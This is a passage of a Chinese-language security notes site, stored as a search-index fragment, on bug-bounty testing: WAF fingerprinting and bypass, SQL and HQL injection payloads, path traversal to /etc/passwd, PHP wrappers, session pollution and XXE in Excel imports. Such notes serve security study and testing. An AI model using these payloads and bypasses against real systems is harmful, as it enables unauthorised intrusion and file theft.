wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002 3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790 \u00b6 \u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528 \u00b6 WEBSERVICE\u63a5\u53e3 \u00b6 1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 \u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165 DWR\u63a5\u53e3 \u00b6 \u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c \u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765 HESSIAN\u63a5\u53e3 \u00b6 GWT\u63a5\u53e3 \u00b6 \u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC \u00b6 SESSION\u6c61\u67d3 \u00b6 \u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898 XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f \u00b6 \u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a \u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"\u4f17\u6d4b\u9879\u76ee"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_1","text":"\u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49","title":"\u524d\u8a00"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_2","text":"\u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 \u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9","title":"\u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#1","text":"\u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 ,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5","title":"1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#2waf","text":"","title":"2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf","text":"WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002","title":"waf\u7684\u539f\u7406"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf_1","text":"WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b","title":"WAF\u5173\u952e\u6280\u672f"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf_2","text":"","title":"waf\u7684\u8bc6\u522b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#cookie","text":"Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c","title":"\u57fa\u4e8eCookie\u503c"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#http","text":"Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d","title":"\u57fa\u4e8eHTTP\u54cd\u5e94"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_3","text":"\u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch","title":"\u7279\u5b9a\u8d44\u6e90\u6587\u4ef6"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#waf_3","text":"","title":"\u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#1-waf","text":"","title":"1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#11","text":"\u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6","title":"1.1\u5bfb\u627e\u6e90\u7ad9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#12","text":"\u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7","title":"1.2\u5229\u7528\u540c\u7f51\u6bb5"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#13","text":"\u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF","title":"1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#2-waf","text":"WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b","title":"2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#3-waf","text":"","title":"3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#31","text":"Waf\u672a\u80fd\u8986\u76d6Content-Type: 